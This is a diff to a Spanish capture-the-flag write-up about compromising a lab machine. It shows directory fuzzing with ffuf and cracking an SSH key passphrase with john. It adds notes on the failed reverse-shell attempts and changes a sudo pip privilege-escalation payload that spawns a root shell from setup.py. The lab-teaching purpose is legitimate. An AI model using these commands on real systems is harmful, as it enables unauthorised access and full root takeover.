@@ -71,8 +71,7 @@ Y da **404**: es un señuelo. La ruta real existe, pero hay que encontrarla enum
 El patrón correcto es `~nombre`, así que se fuzzea sobre esa forma:
 
 ```bash
-sudo ffuf -c -w /usr/share/seclists/Discovery/Web-Content/common.txt \
-  -u 'http://<IP-objetivo>/~FUZZ'
+sudo ffuf -c -w common.txt -u 'http://<IP-objetivo>/~FUZZ'
 ```
 
 Devuelve **`secret`** con un **301**: el directorio es **`/~secret/`**.
@@ -141,11 +140,11 @@ sudo /usr/bin/ssh2john sshkey > ssh2john
 ![ssh2john convierte la clave a un hash que john entiende](evidencia/ssh2john.png)
 
 ```bash
-sudo john --wordlist=/usr/share/wordlists/fasttrack.txt ssh2john
+john --wordlist=/usr/share/wordlists/fasttrack.txt ssh2john
 ```
 
-La passphrase cae en el acto: `lupin (sshkey)`. Es el nombre de la máquina, la pista que el autor
-dejó en el mensaje.
+La passphrase cae en el acto: **`Passw0rd!`**. No hay truco ni pista: es una contraseña de lista,
+y el aviso de `fasttrack` en el mensaje era literal.
 
 ![john con fasttrack: la passphrase de la clave](evidencia/john-passphrase.png)
 
@@ -205,7 +204,19 @@ sudo -u arsene /usr/bin/python3.9 /home/arsene/heist.py
 
 ![El listener esperando la conexión](evidencia/listener-nc.png)
 
-La conexión llega desde la propia máquina y deja una shell como **arsene**, en el home de `icex64`.
+No sale a la primera. El primer intento devuelve `/bin/bash: connect: No route to host` —el listener
+no era alcanzable— y el segundo `Connection refused`, porque `nc` ya no estaba escuchando. Al tercero
+la conexión llega desde la propia máquina y deja una shell como **arsene**, en el home de `icex64`.
+
+![Los dos intentos fallidos antes de la shell](evidencia/intentos-fallidos.png)
+
+Dentro, `cat note.txt` explica el contexto que el autor dejó escrito:
+
+> Hi my friend Icex64, can you please help check if my code is secure to run, I need to use for my
+> next heist. I dont want to anyone else get inside it, because it can compromise my account and find
+> my secret file.
+
+![La shell de arsene y el note.txt](evidencia/note-arsene.png)
 
 ![Shell como arsene](evidencia/shell-arsene.png)
 
@@ -223,7 +234,8 @@ sudo -l
 permisos de quien lanza la orden**, que aquí es root. Un paquete vacío con una línea basta:
 
 ```bash
-TF=$(mktemp -d)
+TF=/tmp/tmp.crt
+mkdir -p $TF
 echo "import os; os.system('sh </dev/tty >/dev/tty 2>/dev/tty')" > $TF/setup.py
 sudo pip install $TF
 ```
